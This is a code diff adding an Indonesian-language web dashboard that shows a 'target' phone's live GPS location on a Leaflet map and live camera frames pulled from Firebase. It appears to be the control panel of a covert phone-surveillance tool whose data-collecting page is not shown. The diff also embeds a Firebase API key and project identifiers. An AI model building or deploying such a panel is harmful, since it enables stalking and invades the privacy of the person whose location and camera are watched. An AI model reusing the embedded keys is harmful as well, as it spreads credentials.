@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dashboard Monitor HP</title>
+
+  <!-- Leaflet CSS untuk Peta -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
+  <!-- Firebase SDK (v9 Compatibility Mode) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f0f2f5;
+    }
+    h2 {
+      text-align: center;
+      color: #333;
+    }
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      justify-content: center;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .card {
+      background: white;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      flex: 1;
+      min-width: 320px;
+    }
+    #map {
+      height: 350px;
+      width: 100%;
+      border-radius: 8px;
+      margin-top: 10px;
+    }
+    .stream-box {
+      width: 100%;
+      height: 350px;
+      background-color: #000;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+    img#streamImage {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+    .status-badge {
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: bold;
+    }
+    .status-online {
+      background-color: #e6f4ea;
+      color: #137333;
+    }
+    .status-offline {
+      background-color: #fce8e6;
+      color: #c5221f;
+    }
+    .info-text {
+      font-size: 14px;
+      color: #666;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Dashboard Monitor Perangkat HP</h2>
+  <hr style="max-width: 1100px; margin-bottom: 25px; border: 0; border-top: 1px solid #ccc;">
+
+  <div class="container">
+    
+    <!-- PANEL 1: HASIL LOKASI -->
+    <div class="card">
+      <h3>
+        📍 Lokasi Perangkat 
+        <span id="statusLokasi" class="status-badge status-offline">Menunggu Data...</span>
+      </h3>
+      <p id="coords" class="info-text">Koordinat: Belum ada data</p>
+      <p id="lastUpdateLoc" class="info-text">Terakhir diperbarui: -</p>
+      
+      <!-- Area Peta Leaflet -->
+      <div id="map"></div>
+    </div>
+
+    <!-- PANEL 2: HASIL KAMERA -->
+    <div class="card">
+      <h3>
+        📷 Kamera Perangkat
+        <span id="statusKamera" class="status-badge status-offline">Offline</span>
+      </h3>
+      <p class="info-text">Tampilan frame langsung dari kamera HP target:</p>
+      
+      <!-- Display Streaming Kamera -->
+      <div class="stream-box">
+        <img id="streamImage" src="" alt="Menunggu stream kamera..." style="display: none;">
+        <span id="placeholderText" style="color: #aaa;">Kamera tidak aktif / Belum diizinkan</span>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Leaflet JS untuk Peta -->
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+  <script>
+    // 1. Konfigurasi Firebase (Harus SAMA DENGAN index.html)
+    const firebaseConfig = {
+  apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
+  authDomain: "sfkk-6af70.firebaseapp.com",
+  projectId: "sfkk-6af70",
+  storageBucket: "sfkk-6af70.firebasestorage.app",
+  messagingSenderId: "1045663352487",
+  appId: "1:1045663352487:web:3948f3c0a8f1e215187d82",
+  measurementId: "G-23SNFYWR8V"
+};
+
+
+    // Inisialisasi Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 2. Inisialisasi Peta (Default Posisi: Jakarta)
+    const defaultLat = -6.200000;
+    const defaultLng = 106.816666;
+    const map = L.map('map').setView([defaultLat, defaultLng], 13);
+
+    // Load Tile Peta OpenStreetMap
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap'
+    }).addTo(map);
+
+    // Marker Peta
+    let marker = L.marker([defaultLat, defaultLng]).addTo(map)
+      .bindPopup('Posisi Perangkat HP')
+      .openPopup();
+
+    // 3. LISTEN DATA LOKASI REALTIME DARI FIREBASE
+    db.ref('device/location').on('value', (snapshot) => {
+      const data = snapshot.val();
+      if (data && data.latitude && data.longitude) {
+        const lat = data.latitude;
+        const lng = data.longitude;
+        const time = data.updatedAt ? new Date(data.updatedAt).toLocaleTimeString() : '-';
+
+        // Update teks koordinat
+        document.getElementById('coords').innerText = `Koordinat: ${lat}, ${lng}`;
+        document.getElementById('lastUpdateLoc').innerText = `Terakhir diperbarui: ${time}`;
+
+        // Update status badge
+        const badge = document.getElementById('statusLokasi');
+        badge.innerText = "Online";
+        badge.className = "status-badge status-online";
+
+        // Geser lokasi peta & marker
+        const newPos = [lat, lng];
+        map.setView(newPos, 16);
+        marker.setLatLng(newPos);
+      }
+    });
+
+    // 4. LISTEN DATA KAMERA REALTIME DARI FIREBASE
+    db.ref('device/cameraFrame').on('value', (snapshot) => {
+      const base64Image = snapshot.val();
+      const imgElem = document.getElementById('streamImage');
+      const placeholder = document.getElementById('placeholderText');
+      const badge = document.getElementById('statusKamera');
+
+      if (base64Image) {
+        // Tampilkan gambar dari frame Base64
+        imgElem.src = base64Image;
+        imgElem.style.display = 'block';
+        placeholder.style.display = 'none';
+
+        // Update status badge kamera
+        badge.innerText = "Live";
+        badge.className = "status-badge status-online";
+      } else {
+        imgElem.style.display = 'none';
+        placeholder.style.display = 'block';
+        badge.innerText = "Offline";
+        badge.className = "status-badge status-offline";
+      }
+    });
+  </script>
+
+</body>
+</html>
